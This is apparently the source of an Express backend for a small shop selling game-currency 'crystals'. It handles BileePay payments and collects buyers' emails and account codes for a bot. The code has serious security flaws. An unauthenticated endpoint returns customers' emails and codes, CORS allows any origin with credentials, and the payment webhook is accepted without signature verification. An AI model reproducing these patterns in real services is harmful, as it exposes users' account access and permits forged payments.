import express from "express";
import axios from "axios";
import crypto from "crypto";
import cors from "cors";
import { Low } from 'lowdb';
import { JSONFile } from 'lowdb/node';
import path from 'path';
import { fileURLToPath } from 'url';

// =========== НАСТРОЙКИ ===========
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PORT = process.env.PORT || 10000;

const CONFIG = {
  // Платежная система
  SHOP_ID: Number(process.env.SHOP_ID) || 0,
  BILEE_PASSWORD: process.env.BILEE_PASSWORD || "",
  BILEE_API: process.env.BILEE_API_URL || "https://paymentgate.bilee.ru/api",
  
  // Безопасность
  API_SECRET: process.env.API_SECRET || "",
  
  // URL
  SERVER_URL: process.env.SERVER_URL || `https://duck-backend-by9a.onrender.com`,
  FRONTEND_URL: process.env.FRONTEND_URL || "https://destrkod.github.io/duck",
  BOT_URL: process.env.BOT_URL || "",
  
  // Настройки
  CREATE_TEST_PRODUCTS: process.env.CREATE_TEST_PRODUCTS === 'true',
  MAX_CART_TOTAL: Number(process.env.MAX_CART_TOTAL) || 10000
};

// =========== CORS ===========
const app = express();
app.use(cors({
  origin: ['https://destrkod.github.io', 'http://localhost:3000', 'http://localhost:5500', '*'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-api-secret', 'Accept']
}));

// Обработка preflight запросов
app.options('*', cors());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// =========== БАЗА ДАННЫХ ===========
const dbFile = path.join(__dirname, 'db.json');
const adapter = new JSONFile(dbFile);
const defaultData = { 
  products: [], 
  orders: [],
  settings: {
    max_cart_total: CONFIG.MAX_CART_TOTAL,
    created_at: new Date().toISOString()
  }
};
const db = new Low(adapter, defaultData);

// =========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===========
function calculateOrderTotal(cart) {
  let total = 0;
  if (!cart || typeof cart !== 'object') return total;
  
  for (const [itemId, quantity] of Object.entries(cart)) {
    const product = db.data.products.find(p => p.id === itemId);
    if (product) {
      total += product.price * quantity;
    }
  }
  return total;
}

async function notifyBot(orderData) {
  try {
    if (!CONFIG.BOT_URL || !CONFIG.API_SECRET) {
      console.log('⚠️ Бот не настроен');
      return false;
    }
    
    const requestData = {
      order_id: orderData.order_id,
      email: orderData.email,
      items: orderData.cart || orderData.items || {},
      amount: orderData.amount || 0,
      code: orderData.code || null,
      stage: orderData.stage || 'email_submitted',
      secret: CONFIG.API_SECRET,
      timestamp: new Date().toISOString()
    };
    
    const response = await axios.post(`${CONFIG.BOT_URL}/api/order-notify`, requestData, {
      timeout: 10000,
      headers: { 'Content-Type': 'application/json' }
    });
    
    if (response.status >= 200 && response.status < 300) {
      console.log(`✅ Уведомление отправлено: ${orderData.order_id}`);
      return true;
    }
    
    return false;
  } catch (error) {
    console.error('❌ Ошибка уведомления:', error.message);
    return false;
  }
}

// =========== ВАЛИДАЦИЯ API ===========
const verifyApiSecret = (req, res, next) => {
  const clientSecret = req.headers['x-api-secret'] || req.query.secret || req.body.secret;
  
  if (!clientSecret || clientSecret !== CONFIG.API_SECRET) {
    console.warn(`🚫 Неавторизованный доступ: ${req.path}`);
    return res.status(403).json({ 
      success: false,
      error: "Invalid API secret" 
    });
  }
  next();
};

// =========== ЭНДПОИНТЫ ДЛЯ ФРОНТЕНДА ===========

// 1. Проверка статуса заказа (GET)
app.get("/api/order-status/:order_id", async (req, res) => {
  try {
    const { order_id } = req.params;
    
    await db.read();
    const order = db.data.orders.find(o => o.id === order_id);
    
    if (!order) {
      return res.json({ 
        success: true, 
        exists: false,
        message: 'Заказ не найден' 
      });
    }
    
    res.json({
      success: true,
      exists: true,
      order_id,
      email: order.email,
      code: order.code,
      status: order.status || 'unknown',
      amount: order.amount || 0,
      created_at: order.created_at,
      updated_at: order.updated_at || order.created_at
    });
    
  } catch (error) {
    console.error("❌ Ошибка проверки статуса:", error);
    res.status(500).json({ 
      success: false,
      error: "Server error" 
    });
  }
});

// 2. Отправка email (POST)
app.post("/submit-email", async (req, res) => {
  try {
    const { order_id, email, cart } = req.body;
    
    console.log(`📧 Получен email для заказа ${order_id}: ${email}`);
    
    if (!order_id || !email || !cart) {
      return res.status(400).json({ 
        success: false, 
        error: "Не все поля заполнены" 
      });
    }
    
    await db.read();
    
    const amount = calculateOrderTotal(cart);
    
    let orderIndex = db.data.orders.findIndex(o => o.id === order_id);
    
    if (orderIndex === -1) {
      const newOrder = {
        id: order_id,
        email: email,
        cart: cart,
        amount: amount,
        status: "pending_email",
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      };
      
      db.data.orders.push(newOrder);
      orderIndex = db.data.orders.length - 1;
    } else {
      db.data.orders[orderIndex].email = email;
      db.data.orders[orderIndex].cart = cart;
      db.data.orders[orderIndex].amount = amount;
      db.data.orders[orderIndex].status = "pending_email";
      db.data.orders[orderIndex].updated_at = new Date().toISOString();
    }
    
    await db.write();
    
    console.log(`✅ Email сохранен для заказа ${order_id}`);
    
    // Уведомляем бота
    const botNotified = await notifyBot({
      order_id,
      email,
      cart,
      amount,
      stage: "email_submitted"
    });
    
    console.log(`🤖 Уведомление боту: ${botNotified ? '✅ Отправлено' : '❌ Ошибка'}`);
    
    res.json({ 
      success: true, 
      message: "Email сохранен",
      order_id,
      email,
      amount,
      bot_notified: botNotified
    });
    
  } catch (error) {
    console.error("❌ Ошибка сохранения email:", error);
    res.status(500).json({ 
      success: false,
      error: "Server error" 
    });
  }
});

// 3. Отправка кода (POST)
app.post("/api/submit-code", async (req, res) => {
  try {
    const { order_id, email, code } = req.body;
    
    if (!order_id || !email || !code) {
      return res.status(400).json({ 
        success: false, 
        error: "Не все поля заполнены" 
      });
    }
    
    console.log(`🔢 Получен код для заказа ${order_id}: ${code}`);
    
    await db.read();
    
    const orderIndex = db.data.orders.findIndex(o => o.id === order_id);
    
    if (orderIndex === -1) {
      return res.status(404).json({ 
        success: false, 
        error: "Заказ не найден" 
      });
    }
    
    if (db.data.orders[orderIndex].email !== email) {
      return res.status(400).json({ 
        success: false, 
        error: "Email не совпадает" 
      });
    }
    
    db.data.orders[orderIndex].code = code;
    db.data.orders[orderIndex].status = "pending_code";
    db.data.orders[orderIndex].code_submitted_at = new Date().toISOString();
    db.data.orders[orderIndex].updated_at = new Date().toISOString();
    
    await db.write();
    
    console.log(`✅ Код сохранен для заказа ${order_id}`);
    
    // Уведомляем бота
    const botNotified = await notifyBot({
      order_id,
      email,
      items: db.data.orders[orderIndex].cart,
      amount: db.data.orders[orderIndex].amount,
      code: code,
      stage: "code_submitted"
    });
    
    res.json({ 
      success: true, 
      message: "Код отправлен на проверку",
      order_id,
      status: "pending",
      next_check: Date.now() + 5000,
      bot_notified: botNotified
    });
    
  } catch (error) {
    console.error("❌ Ошибка сохранения кода:", error);
    res.status(500).json({ 
      success: false,
      error: "Server error" 
    });
  }
});

// =========== ОСНОВНЫЕ ЭНДПОИНТЫ ===========

// 4. Товары (GET)
app.get("/api/products", async (req, res) => {
  try {
    await db.read();
    
    if (CONFIG.CREATE_TEST_PRODUCTS && db.data.products.length === 0) {
      db.data.products = [
        {
          id: "c30",
          name: "30 кристаллов",
          price: 200,
          img: "https://i.imgur.com/s4K0WIP.png",
          gift: false
        },
        {
          id: "c80",
          name: "80 кристаллов",
          price: 550,
          img: "https://i.imgur.com/XbnZKDb.png",
          gift: false
        }
      ];
      await db.write();
      console.log("✅ Созданы тестовые товары");
    }
    
    res.json({
      success: true,
      products: db.data.products,
      count: db.data.products.length,
      max_cart_total: db.data.settings.max_cart_total
    });
  } catch (error) {
    console.error("❌ Ошибка получения товаров:", error);
    res.status(500).json({ 
      success: false,
      error: "Server error",
      products: [] 
    });
  }
});

// 5. Добавить товар (POST) - для бота
app.post("/api/add-product", async (req, res) => {
  try {
    const { id, name, price, image, gift = false, secret } = req.body;
    
    if (!secret || secret !== CONFIG.API_SECRET) {
      return res.status(401).json({ 
        success: false,
        error: "Unauthorized" 
      });
    }
    
    if (!id || !name || !price || !image) {
      return res.status(400).json({ 
        success: false,
        error: "Missing required fields" 
      });
    }
    
    await db.read();
    
    if (db.data.products.find(p => p.id === id)) {
      return res.status(400).json({ 
        success: false,
        error: "Product already exists" 
      });
    }
    
    const newProduct = {
      id,
      name,
      price: Number(price),
      img: image,
      gift: Boolean(gift),
      created_at: new Date().toISOString()
    };
    
    db.data.products.push(newProduct);
    await db.write();
    
    console.log(`✅ Товар добавлен: ${name} (${price}₽)`);
    
    res.json({
      success: true,
      product: newProduct,
      count: db.data.products.length
    });
    
  } catch (error) {
    console.error("❌ Ошибка добавления товара:", error);
    res.status(500).json({ 
      success: false,
      error: "Server error"
    });
  }
});

// 6. Удалить товар (POST) - для бота
app.post("/api/delete-product", verifyApiSecret, async (req, res) => {
  try {
    const { id } = req.body;
    
    if (!id) {
      return res.status(400).json({ 
        success: false,
        error: "Product ID required" 
      });
    }
    
    await db.read();
    
    const initialCount = db.data.products.length;
    db.data.products = db.data.products.filter(p => p.id !== id);
    
    if (db.data.products.length === initialCount) {
      return res.status(404).json({ 
        success: false,
        error: "Product not found" 
      });
    }
    
    await db.write();
    
    res.json({
      success: true,
      deleted: id,
      count: db.data.products.length
    });
    
  } catch (error) {
    console.error("❌ Ошибка удаления товара:", error);
    res.status(500).json({ 
      success: false,
      error: "Server error" 
    });
  }
});

// 7. Обновление статуса заказа (POST) - для бота
app.post("/api/order-status-update", async (req, res) => {
  try {
    const { order_id, status, admin_comment, secret } = req.body;
    
    if (!secret || secret !== CONFIG.API_SECRET) {
      return res.status(401).json({ 
        success: false, 
        error: "Unauthorized" 
      });
    }
    
    if (!order_id || !status) {
      return res.status(400).json({ 
        success: false, 
        error: "Missing required fields" 
      });
    }
    
    console.log(`🔄 Обновление статуса заказа ${order_id}: ${status}`);
    
    await db.read();
    
    const orderIndex = db.data.orders.findIndex(o => o.id === order_id);
    
    if (orderIndex === -1) {
      console.log(`❌ Заказ ${order_id} не найден`);
      return res.status(404).json({ 
        success: false, 
        error: "Order not found" 
      });
    }
    
    db.data.orders[orderIndex].status = status;
    db.data.orders[orderIndex].updated_at = new Date().toISOString();
    
    if (admin_comment) {
      db.data.orders[orderIndex].admin_comment = admin_comment;
    }
    
    if (status === "completed") {
      db.data.orders[orderIndex].completed_at = new Date().toISOString();
      console.log(`✅ Заказ ${order_id} завершен`);
    } else if (status === "rejected") {
      db.data.orders[orderIndex].rejected_at = new Date().toISOString();
      console.log(`❌ Заказ ${order_id} отклонен`);
    }
    
    await db.write();
    
    res.json({ 
      success: true, 
      message: "Статус обновлен",
      order_id,
      status 
    });
    
  } catch (error) {
    console.error("❌ Ошибка обновления статуса:", error);
    res.status(500).json({ 
      success: false,
      error: "Server error" 
    });
  }
});

// 8. Список заказов для админа (GET)
app.get("/api/admin/orders", verifyApiSecret, async (req, res) => {
  try {
    const { limit = 50, status } = req.query;
    
    await db.read();
    
    let orders = db.data.orders;
    if (status) {
      orders = orders.filter(o => o.status === status);
    }
    
    orders.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    orders = orders.slice(0, parseInt(limit));
    
    const formattedOrders = orders.map(order => ({
      id: order.id,
      email: order.email,
      code: order.code,
      status: order.status,
      amount: order.amount || 0,
      created_at: order.created_at,
      updated_at: order.updated_at,
      admin_comment: order.admin_comment
    }));
    
    res.json({
      success: true,
      orders: formattedOrders,
      count: formattedOrders.length,
      total_count: db.data.orders.length
    });
    
  } catch (error) {
    console.error("❌ Ошибка получения заказов:", error);
    res.status(500).json({ 
      success: false,
      error: "Server error" 
    });
  }
});

// 9. Платежная система
app.post("/create-payment", async (req, res) => {
  try {
    const { items, method } = req.body;
    
    if (!items || !method) {
      return res.status(400).json({ 
        success: false,
        error: "Items and method required" 
      });
    }
    
    if (CONFIG.SHOP_ID === 0 || !CONFIG.BILEE_PASSWORD) {
      return res.status(500).json({ 
        success: false,
        error: "Payment system not configured" 
      });
    }
    
    const amountRub = calculateOrderTotal(items);
    
    if (amountRub === 0) {
      return res.status(400).json({ 
        success: false,
        error: "Cart total is zero" 
      });
    }
    
    const order_id = `duck_${Date.now()}`;
    
    await db.read();
    
    const newOrder = {
      id: order_id,
      cart: items,
      amount: amountRub,
      status: "created",
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString()
    };
    
    db.data.orders.push(newOrder);
    await db.write();
    
    // Генерация подписи для BileePay
    const generateSignature = (data, password) => {
      const tokenData = { ...data, password };
      const excludedKeys = ["metadata", "signature"];
      
      const sortedKeys = Object.keys(tokenData)
        .filter((key) => !excludedKeys.includes(key))
        .sort();
      
      const valuesString = sortedKeys
        .map((key) => tokenData[key])
        .join("");
      
      const hash = crypto.createHash("sha256");
      hash.update(valuesString, "utf8");
      return hash.digest("hex");
    };
    
    const payload = {
      order_id,
      method_slug: method,
      amount: amountRub, 
      shop_id: CONFIG.SHOP_ID,
      success_url: `${CONFIG.FRONTEND_URL}/success-pay.html?order=${order_id}`,
      fail_url: `${CONFIG.FRONTEND_URL}/fail.html`,
      description: `Заказ #${order_id.substring(0, 8)}`,
      notify_url: `${CONFIG.SERVER_URL}/bilee-notify`
    };
    
    payload.signature = generateSignature(payload, CONFIG.BILEE_PASSWORD);
    
    const response = await axios.post(
      `${CONFIG.BILEE_API}/payment/init`,
      payload,
      { 
        timeout: 15000,
        headers: { 'Content-Type': 'application/json' }
      }
    );
    
    if (response.data && response.data.url) {
      res.json({
        success: true,
        url: response.data.url,
        order_id,
        amount: amountRub
      });
    } else {
      throw new Error("Payment gateway error");
    }
    
  } catch (error) {
    console.error("❌ Ошибка платежа:", error.message);
    
    res.status(500).json({
      success: false,
      error: error.response?.data || error.message
    });
  }
});

// 10. Вебхук BileePay
app.post("/bilee-notify", async (req, res) => {
  try {
    const { order_id, status } = req.body;
    
    console.log("📦 Вебхук от BileePay:", { order_id, status });
    
    if (order_id) {
      await db.read();
      const orderIndex = db.data.orders.findIndex(o => o.id === order_id);
      
      if (orderIndex !== -1) {
        db.data.orders[orderIndex].payment_status = status;
        db.data.orders[orderIndex].updated_at = new Date().toISOString();
        
        if (status === 'success') {
          db.data.orders[orderIndex].paid_at = new Date().toISOString();
        }
        
        await db.write();
      }
    }
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("❌ Ошибка вебхука:", error);
    res.status(200).json({ success: true });
  }
});

// =========== СИСТЕМНЫЕ ЭНДПОИНТЫ ===========

// Health check
app.get("/health", (req, res) => {
  res.json({
    status: "healthy",
    service: "duck-backend",
    time: new Date().toISOString(),
    config: {
      shop_configured: CONFIG.SHOP_ID > 0,
      bot_configured: !!(CONFIG.BOT_URL && CONFIG.API_SECRET),
      api_secret_set: !!CONFIG.API_SECRET
    }
  });
});

// Главная страница
app.get("/", async (req, res) => {
  await db.read();
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>🦆 Duck Shop Backend</title>
      <style>
        body { font-family: Arial; padding: 20px; }
        .status { background: #4CAF50; color: white; padding: 10px; border-radius: 5px; }
        .info { background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 10px 0; }
      </style>
    </head>
    <body>
      <h1>🦆 Duck Shop Backend</h1>
      <div class="status">✅ Сервер работает</div>
      
      <div class="info">
        <h3>📊 Статистика:</h3>
        <p>🛒 Товаров: ${db.data.products.length}</p>
        <p>📦 Заказов: ${db.data.orders.length}</p>
        <p>🌐 URL: ${CONFIG.SERVER_URL}</p>
        <p>🔐 API: ${CONFIG.API_SECRET ? '✅ Настроен' : '❌ Не настроен'}</p>
        <p>🤖 Бот: ${CONFIG.BOT_URL ? '✅ Подключен' : '❌ Не подключен'}</p>
      </div>
      
      <div class="info">
        <h3>📡 API Endpoints:</h3>
        <ul>
          <li><a href="/api/products">GET /api/products</a> - Список товаров</li>
          <li>POST /submit-email - Отправить email</li>
          <li>POST /api/submit-code - Отправить код</li>
          <li>GET /api/order-status/:id - Статус заказа</li>
          <li>POST /create-payment - Создать платеж</li>
          <li><a href="/health">GET /health</a> - Проверка здоровья</li>
        </ul>
      </div>
    </body>
    </html>
  `);
});

// =========== ЗАПУСК СЕРВЕРА ===========
const startServer = async () => {
  try {
    // Загружаем базу
    await db.read();
    
    // Создаем тестовые товары если нужно
    if (CONFIG.CREATE_TEST_PRODUCTS && db.data.products.length === 0) {
      db.data.products = [
        { id: "c30", name: "30 кристаллов", price: 200, img: "https://i.imgur.com/s4K0WIP.png", gift: false },
        { id: "c80", name: "80 кристаллов", price: 550, img: "https://i.imgur.com/XbnZKDb.png", gift: false }
      ];
      await db.write();
      console.log("✅ Созданы тестовые товары");
    }
    
    app.listen(PORT, "0.0.0.0", () => {
      console.log(`✅ Сервер запущен на порту ${PORT}`);
      console.log('🔧 =========== НАСТРОЙКИ ===========');
      console.log(`🛒 Shop ID: ${CONFIG.SHOP_ID ? '✅ ' + CONFIG.SHOP_ID : '❌ Не настроен'}`);
      console.log(`🤖 Бот URL: ${CONFIG.BOT_URL ? '✅ ' + CONFIG.BOT_URL : '❌ Не настроен'}`);
      console.log(`🔐 API Secret: ${CONFIG.API_SECRET ? '✅ Установлен' : '❌ Не установлен'}`);
      console.log(`🌐 Server URL: ${CONFIG.SERVER_URL}`);
      console.log(`🌍 Frontend URL: ${CONFIG.FRONTEND_URL}`);
      console.log(`🛍️ API товаров: ${CONFIG.SERVER_URL}/api/products`);
      console.log(`📧 Отправка email: ${CONFIG.SERVER_URL}/submit-email`);
      console.log(`💸 Платежный API: ${CONFIG.SERVER_URL}/create-payment`);
      console.log(`🔄 Уведомления боту: ${CONFIG.BOT_URL && CONFIG.API_SECRET ? '✅ Активны' : '❌ Не активны'}`);
      console.log('====================================');
      console.log('🚀 Сервер готов к работе!');
    });
    
  } catch (error) {
    console.error('❌ Ошибка запуска сервера:', error);
    process.exit(1);
  }
};

startServer();
